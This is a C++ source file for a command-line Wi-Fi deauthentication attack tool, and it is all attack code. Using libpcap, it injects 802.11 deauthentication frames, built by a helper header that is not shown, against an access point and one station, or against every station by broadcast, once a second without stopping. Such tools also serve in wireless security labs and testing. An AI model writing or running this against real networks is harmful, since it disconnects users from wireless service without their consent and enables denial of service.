#include <stdio.h>
#include <pcap.h>
#include <unistd.h>
#include <stdint.h>
#include <iostream>
#include<string>
#include "header.h"
#include "mac.h"
using namespace std;
void usage() {
    printf("syntax : deauth-attack <interface> <ap mac> [<station mac>]\n");
    printf("sample : deauth-attack wlan1 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}
void send_deauth(pcap_t* handle, Mac ap, Mac st){
    static int count=1;
    deauth_packet packet=deauth_packet(ap,st);
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(deauth_packet)); 
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
    cout<<"[INFO] DEAUTH!! from "<<string(ap)<<" to "<<string(st)<<" ["<<count++<<"]"<<endl;
}
int main(int argc, char* argv[]) {
    Mac ap;
    Mac st;
    if (argc < 3) {
        usage();
        return -1;
    }
    if(argc==3){
        ap=Mac(string(argv[2]));
        st=Mac("ff:ff:ff:ff:ff:ff");
    }
    else{
        ap=Mac(string(argv[2]));
        st=Mac(string(argv[3]));
    }
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf);
        return -1;
    }

    while (true) {
        send_deauth(handle, ap,st);
        sleep(1);
    }
    pcap_close(handle);
}
